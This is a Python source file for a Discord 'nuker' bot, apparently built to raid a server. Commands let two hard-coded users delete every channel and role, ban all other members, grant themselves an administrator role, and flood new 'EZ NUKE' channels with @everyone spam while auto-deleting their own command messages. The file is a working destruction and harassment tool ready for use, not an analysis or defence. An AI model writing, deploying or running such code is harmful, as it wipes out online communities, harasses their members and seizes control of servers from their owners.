import discord
from discord.ext import commands
import asyncio
from pythonping import ping
import signal
import sys

TOKEN = 'YOUR_BOT_TOKEN_HERE'
CHANNEL_NAME = 'general'
AUTHORIZED_USERS = {
    YOUR_FRIEND_USERID_HERE, YOUR_USERID_HERE
}
LOCKDOWN_MASTER = YOUR_USERID_HERE

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)
lockdown = False
spam_tasks = []

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith('!help'):
        await message.delete()
        await message.channel.send("!help is deprecated. Please use !cmds instead")
        return

    await bot.process_commands(message)

def lockdown_check():
    async def predicate(ctx):
        if lockdown and ctx.author.id != LOCKDOWN_MASTER:
            await ctx.send("Sorry im in lockdown!")
            await delete_message_after_delay(ctx.message)
            return False
        return True
    return commands.check(predicate)

@bot.command(name='cmds')
@lockdown_check()
async def cmds(ctx):
    embed = discord.Embed(title="Command List", description="List of available commands", color=0x00ff00)
    
    if ctx.author.id in AUTHORIZED_USERS:
        embed.add_field(name='!ping', value='Pings a specified address. Example: `!ping google.com`', inline=False)
        embed.add_field(name='!banall', value='Bans all unauthorized users. Example: `!banall`', inline=False)
        embed.add_field(name='!unbanall', value='Unbans all users. Example: `!unbanall`', inline=False)
        embed.add_field(name='!ban', value='Bans a specific user. Example: `!ban @user`', inline=False)
        embed.add_field(name='!unban', value='Unbans a specific user by ID. Example: `!unban 123456789`', inline=False)
        embed.add_field(name='!nuke', value='Deletes all channels in the server.', inline=False)
        embed.add_field(name='!admingive', value='Gives admin role to all authorized users.', inline=False)
        embed.add_field(name='!rolenuker', value='Deletes all roles except "AdminRole" and "Loop".', inline=False)
        embed.add_field(name='!lockdown', value='Enables lockdown mode for the bot.', inline=False)
        embed.add_field(name='!unlockdown', value='Disables lockdown mode for the bot.', inline=False)
        embed.add_field(name='!message', value='Sends a message to a specified server and channel. Example: `!message 123456789012345678 123456789012345678 Hello World`', inline=False)
        embed.add_field(name='!completenuker', value='Combines !rolenuker, !banall, !nuke, and !admingive into one command.', inline=False)
        embed.add_field(name='!cancelcompletenuker', value='Stops the spamming initiated by !completenuker.', inline=False)
    else:
        embed.add_field(name='!ping', value='Pings a specified address. Example: `!ping google.com`', inline=False)
        embed.add_field(name='!ban', value='Bans a specific user. Example: `!ban @user`', inline=False)
        embed.add_field(name='!unban', value='Unbans a specific user by ID. Example: `!unban 123456789`', inline=False)
        embed.add_field(name='!message', value='Sends a message to a specified server and channel. Example: `!message 123456789012345678 123456789012345678 Hello World`', inline=False)

    response = await ctx.send(embed=embed)
    await delete_message_after_delay(ctx.message)
    await delete_message_after_delay(response, delay=10)

@bot.command(name='message')
@lockdown_check()
async def message(ctx, server_id: int = None, channel_id: int = None, *, content: str = None):
    if server_id is None or channel_id is None or content is None:
        response = await ctx.send("Please refer to the !cmds command for usage")
        await delete_message_after_delay(ctx.message)
        await delete_message_after_delay(response, delay=10)
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        response = await ctx.send("I am not in that server!")
        await delete_message_after_delay(ctx.message)
        await delete_message_after_delay(response, delay=10)
        return

    channel = guild.get_channel(channel_id)
    if channel is None:
        response = await ctx.send("I am not in that channel!")
        await delete_message_after_delay(ctx.message)
        await delete_message_after_delay(response, delay=10)
        return

    await channel.send(content)
    await delete_message_after_delay(ctx.message)

@bot.command(name='completenuker')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def completenuker(ctx):
    await ctx.message.delete()
    await ctx.send("NUKED BY ANTI BELLA SERVER")

    guild = ctx.guild

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel {channel.name}: {e}")

    for _ in range(10):
        try:
            new_channel = await guild.create_text_channel('EZ NUKE')
            spam_task = asyncio.create_task(spam_channel(new_channel))
            spam_tasks.append(spam_task)
        except Exception as e:
            print(f"Error creating channel or sending message: {e}")

async def spam_channel(channel):
    for _ in range(10):
        try:
            await channel.send('@everyone IMAGINE BEING NUKED AS')
        except Exception as e:
            print(f"Error sending message in channel {channel.name}: {e}")
        await asyncio.sleep(1)

@bot.command(name='cancelcompletenuker')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def cancelcompletenuker(ctx):
    await ctx.message.delete()
    for task in spam_tasks:
        task.cancel()
    spam_tasks.clear()
    await ctx.send("Completenuker spamming has been canceled.")
    await delete_message_after_delay(ctx.message)

@bot.command(name='banall')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def banall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        if member.id in AUTHORIZED_USERS:
            continue
        try:
            await member.ban(reason="Emergency banall command")
        except Exception as e:
            print(f"Error banning {member}: {e}")

@bot.command(name='unbanall')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def unbanall(ctx):
    await ctx.message.delete()
    async for entry in ctx.guild.bans():
        user = entry.user
        if user.id in AUTHORIZED_USERS:
            continue
        try:
            await ctx.guild.unban(user)
        except Exception as e:
            print(f"Error unbanning {user}: {e}")

@bot.command(name='ban')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def ban(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        response = await ctx.send("Please specify a user to ban by mentioning them.")
        await delete_message_after_delay(response, delay=10)
        return
    if user.id in AUTHORIZED_USERS:
        response = await ctx.send("You cannot ban an authorized user.")
        await delete_message_after_delay(response, delay=10)
        return
    try:
        await user.ban(reason="Banned by command")
        response = await ctx.send(f"Banned {user.mention} ({user.id})")
    except Exception as e:
        print(f"Error banning {user}: {e}")
        response = await ctx.send("There was an error trying to ban the user.")
    await delete_message_after_delay(response, delay=10)

@bot.command(name='unban')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def unban(ctx, user_id: int = None):
    await ctx.message.delete()
    if user_id is None:
        response = await ctx.send("Please specify a user ID to unban.")
        await delete_message_after_delay(response, delay=10)
        return
    user = discord.Object(id=user_id)
    try:
        await ctx.guild.unban(user)
        response = await ctx.send(f"Unbanned user with ID {user_id}")
    except discord.NotFound:
        response = await ctx.send(f"User with ID {user_id} was not found in the bans.")
    except Exception as e:
        print(f"Error unbanning user with ID {user_id}: {e}")
        response = await ctx.send("There was an error trying to unban the user.")
    await delete_message_after_delay(response, delay=10)

@bot.command(name='nuke')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("NUKED BY ANTI BELLA SERVER")
    await asyncio.sleep(3)
    await ctx.send("3")
    await asyncio.sleep(1)
    await ctx.send("2")
    await asyncio.sleep(1)
    await ctx.send("1")
    await asyncio.sleep(1)
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel {channel.name}: {e}")

@bot.command(name='admingive')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def admingive(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    role_name = "AdminRole"
    role = discord.utils.get(guild.roles, name=role_name)
    if role:
        if not role.permissions.administrator:
            await role.delete()
            role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
    else:
        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
    for user_id in AUTHORIZED_USERS:
        member = guild.get_member(user_id)
        if member:
            await member.add_roles(role)

@bot.command(name='rolenuker')
@lockdown_check()
@commands.check(lambda ctx: ctx.author.id in AUTHORIZED_USERS)
async def rolenuker(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for role in guild.roles:
        if role.name not in ["AdminRole", "Loop"]:
            try:
                await role.delete()
            except Exception as e:
                print(f"Error deleting role {role.name}: {e}")

@bot.command(name='lockdown')
async def lockdown_command(ctx):
    global lockdown
    await ctx.message.delete()
    if ctx.author.id != LOCKDOWN_MASTER:
        response = await ctx.send("You are not authorized lil bro :sob:")
        await delete_message_after_delay(response, delay=10)
        return
    lockdown = True
    response = await ctx.send("Bot is now in lockdown.")
    await delete_message_after_delay(response, delay=10)

@bot.command(name='unlockdown')
async def unlockdown(ctx):
    global lockdown
    await ctx.message.delete()
    if ctx.author.id != LOCKDOWN_MASTER:
        response = await ctx.send("You are not authorized lil bro :sob:")
        await delete_message_after_delay(response, delay=10)
        return
    lockdown = False
    response = await ctx.send("Bot is no longer in lockdown.")
    await delete_message_after_delay(response, delay=10)

async def delete_message_after_delay(message, delay=10):
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except discord.NotFound:
        pass

def stop_bot(signal, frame):
    asyncio.run_coroutine_threadsafe(bot.close(), bot.loop)
    sys.exit(0)

signal.signal(signal.SIGINT, stop_bot)

bot.run(TOKEN)
